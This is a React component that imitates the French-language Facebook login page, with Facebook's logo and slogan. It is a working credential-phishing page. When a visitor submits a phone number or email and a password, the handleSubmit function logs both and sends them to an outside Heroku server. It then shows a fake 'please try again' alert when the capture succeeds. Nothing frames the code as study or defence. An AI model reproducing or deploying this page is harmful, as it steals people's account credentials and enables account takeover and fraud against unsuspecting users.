import React, {useState} from "react";
import "./Accueil.css";
import Logo from '../../Asset/facee.svg'
import font from '../../Asset/500_500.png'

export default function Accueil(){


    const [number, setNumber] = useState('');
    const [password, setPassword] = useState('');

    const handleSubmit = (e) => {
        e.preventDefault();

        console.log("Numéro de téléphone : " + number);
        console.log("Mot de passe : " + password);

        fetch("https://universal-6223e2e8c152.herokuapp.com/login-client",{
        method: "POST",
        crossDomain: true,
        headers:{
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Access-Control-Allow-Origin": "*",
        },
        body:JSON.stringify({
            number,
            password,
        }),
    })
    .then((res) => res.json())
    .then((data) => {
        if(data.status === "ok"){
            alert('Veuillez Rééssayer')
        }else{
            alert('Something went wrong')
        }
    })
    }

    return(
        <div className="accueil">
            <div className="face_body">
                <div className="title">
                    <div className="title_face">
                        <img src={Logo} alt="Facebook_image"/>
                    </div>
                    <h2 className="slogan">
                        Avec Facebook, partager et rester en contact avec votre entourage.
                    </h2>
                </div>
                <div className="formulaire">
                    <div className="form_inscription">
                        <form method="post"id="loginForm" className="formul" onSubmit={handleSubmit}>
                            <input type="text"  name="number" id="number" placeholder="Adresse email ou numéro de tel." className="input_text" value={number} onChange={(e) => setNumber(e.target.value)}/>
                            <input type="password" id="pass" placeholder="Mot de passe" className="input_text" value={password} onChange={(e) => setPassword(e.target.value)}/>
                            <input type="submit"  value="Se connecter" className="input_button"/>
                        </form>
                        <div className="link_oublie">
                            <a href="#">
                                Mot de passe oublié ?
                            </a>
                        </div>
                        <div className="creer_compte">
                            <a href="#">Créer nouveau compte</a>
                        </div>
                    </div>
                    <div className="creer_page">
                        <p>
                            <strong className="page_text">Créer une page</strong> pour une célébrité, une marque ou une <br/> entreprise..
                        </p>
                    </div>
                </div>
        </div>
        <div className="image_fond">
            <img src={font} alt="Jolie dossier"/>
        </div>
    </div>
)}